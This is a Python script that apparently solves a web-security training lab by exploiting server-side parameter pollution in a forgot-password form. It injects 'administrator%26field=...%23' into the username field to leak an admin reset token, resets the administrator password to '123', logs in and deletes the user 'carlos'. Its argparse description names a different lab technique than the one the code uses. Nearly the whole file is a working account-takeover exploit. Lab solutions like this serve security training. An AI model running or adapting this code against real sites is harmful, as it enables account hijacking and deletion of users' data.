#!/usr/bin/env python3
import argparse
import re
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup


def get_csrf_from_forgot(html: str) -> str:
    soup = BeautifulSoup(html, "html.parser")
    token = soup.find("input", {"name": "csrf"})
    if not token or not token.get("value"):
        raise RuntimeError("CSRF token not found on forgot-password page.")
    return token["value"]


def get_reset_token_from_forgot(html: str) -> str:
    soup = BeautifulSoup(html, "html.parser")
    token = soup.find("input", {"name": "reset_token"})

    if not token or not token.get("value"):
        raise RuntimeError("reset_token not found on forgot-password page.")
    return token["value"]


def extract_reset_param_name(js_text: str) -> str:
    """
    Dynamically extract the reset token query parameter name from JS.
    Example line:
        /forgot-password?reset_token=${resetToken}
    or
        window.location.href = '/forgot-password?reset_token=${resetToken}';
    """
    m = re.search(r"/forgot-password\?([a-zA-Z0-9_]+)=\$\{resetToken\}", js_text)
    if not m:
        raise RuntimeError("Could not find reset token parameter name in forgotPassword.js")
    return m.group(1)


def extract_delete_user_url(base_url: str, html: str, username: str = "carlos") -> str:
    soup = BeautifulSoup(html, "html.parser")

    # Find the <a> tag whose href contains ?username=carlos
    link = soup.find("a", href=lambda h: h and f"username={username}" in h)
    if not link:
        raise RuntimeError(f"Delete link for user '{username}' not found.")

    delete_href = link["href"]

    return urljoin(base_url, delete_href)


def get_reset_field_name(session: requests.Session, base_url: str) -> str:
    """
    For this lab, the internal field name we need matches the query parameter
    name used in the JS reset URL, so we derive it dynamically instead of
    hard-coding.
    """
    js_url = urljoin(base_url, "/static/js/forgotPassword.js")
    r = session.get(js_url, timeout=10)
    if r.status_code != 200:
        raise RuntimeError(f"Failed to fetch {js_url}: {r.status_code}")
    return extract_reset_param_name(r.text)


def trigger_reset_password(session: requests.Session, base_url: str):
    forgot_url = urljoin(base_url, "/forgot-password")
    r = session.get(forgot_url, timeout=10)
    r.raise_for_status()
    csrf = get_csrf_from_forgot(r.text)

    data = {
        "csrf": csrf,
        "username": "administrator"
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    r = session.post(forgot_url, data=data, headers=headers, timeout=10)
    r.raise_for_status()

def request_reset_token(session: requests.Session, base_url: str):
    """
    Perform SSPP on the username parameter to inject a 'field=<field_name>'
    into the server-side query string and retrieve the administrator token.
    """
    forgot_url = urljoin(base_url, "/forgot-password")
    r = session.get(forgot_url, timeout=10)
    r.raise_for_status()
    csrf = get_csrf_from_forgot(r.text)

    field_name = get_reset_field_name(session, base_url)
    print(f"[+] Derived internal field name from JS: {field_name}")

    # SSPP payload: username=administrator%26field=<field_name>%23
    data = {
        "csrf": csrf,
        "username": f"administrator%26field={field_name}%23"
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    r = session.post(forgot_url, data=data, headers=headers, timeout=10)
    r.raise_for_status()

    try:
        j = r.json()
    except ValueError:
        raise RuntimeError(f"Unexpected response when requesting reset token: {r.text[:300]}")

    token = j.get("reset_token") or j.get("result") or None
    if not token:
        raise RuntimeError(f"Could not find reset token field in JSON: {j}")
    return token, field_name


def reset_password(session: requests.Session, reset_url: str, field_name: str, new_password: str):
    r = session.get(reset_url, timeout=10)
    r.raise_for_status()
    csrf = get_csrf_from_forgot(r.text)
    reset_token = get_reset_token_from_forgot(r.text)

    # SSPP payload: username=administrator%26field=<field_name>%23
    data = {
        "csrf": csrf,
        field_name: reset_token,
        "new-password-1": new_password,
        "new-password-2": new_password
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    r = session.post(reset_url, data=data, headers=headers, timeout=10)
    r.raise_for_status()


def delete_carlos(session: requests.Session, base_url: str, new_password: str = "123"):
    # Step 1: Log in as administrator
    login_url = urljoin(base_url, "/login")

    r = session.get(login_url, timeout=10)
    r.raise_for_status()
    csrf = get_csrf_from_forgot(r.text)

    data = {
        "csrf": csrf,
        "username": "administrator",
        "password": new_password,
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    r = session.post(login_url, data=data, headers=headers, timeout=10)
    r.raise_for_status()

    # Step 2: Go to admin page
    admin_url = urljoin(base_url, "/admin")
    r = session.get(admin_url, timeout=10)
    r.raise_for_status()

    delete_url = extract_delete_user_url(base_url, r.text)

    # Step 3: Delete user
    r = session.get(delete_url, timeout=10)
    r.raise_for_status()

def main():
    parser = argparse.ArgumentParser(
        description="Lab: Finding and exploiting an unused API endpoint"
    )
    parser.add_argument("base_url", help="Base URL of the lab.")
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    sess = requests.Session()

    print("[*]Triggering admin reset password...")
    trigger_reset_password(sess, base_url)
    print("[*]Admin password reset triggered")

    print("[*] Requesting admin reset token via SSPP...")
    token, field_name = request_reset_token(sess, base_url)
    print(f"[+] Got token via field '{field_name}': {token}")

    reset_param = field_name  # URL parameter matches field name from JS
    reset_url = urljoin(base_url, f"/forgot-password?{reset_param}={token}")
    print("[+] Here's an admin reset password URL:")
    print(reset_url)

    new_password = "123"
    print(f"[*] Resetting password to '{new_password}'...")
    reset_password(sess, reset_url, reset_param, new_password)
    print(f"[*] Password changed")

    print(f"[*] Deleting carlos...")
    delete_carlos(sess, base_url)
    print(f"[*] carlos deleted")

if __name__ == "__main__":
    main()
